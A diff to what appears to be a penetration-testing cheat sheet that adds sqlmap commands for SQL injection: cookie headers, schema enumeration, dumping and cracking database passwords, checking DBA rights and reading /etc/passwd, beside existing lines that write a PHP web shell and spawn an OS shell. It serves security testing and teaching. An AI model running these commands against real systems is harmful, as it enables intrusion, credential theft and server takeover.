@@ -396,6 +396,9 @@ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
 # SQLMap with POST request specifying an unjection point with asterisk
 sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
 
+# Specifying a Cookie Header
+sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+
 # Passing an HTTP request file to SQLMap
 sqlmap -r req.txt
 
@@ -417,17 +420,37 @@ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surna
 # Conditional enumeration
 sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
 
+# Database Schema Enumeration
+sqlmap -u "http://www.example.com/?id=1" --schema
+
+# Password Enumeration and Cracking
+sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+
 # CSRF token bypass
 sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
 
 # List all tamper scripts
 sqlmap --list-tampers
 
+# Check for DBA Privileges
+sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+
+# Read File
+sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+
 # Writing a file
 sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
 
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
+
+The technique characters `BEUSTQ` refers to the following:
+- `B`: Boolean-based blind
+- `E`: Error-based
+- `U`: Union query-based
+- `S`: Stacked queries
+- `T`: Time-based blind
+- `Q`: Inline queries
 ```
 
 ## SQL Injection (SQLi)
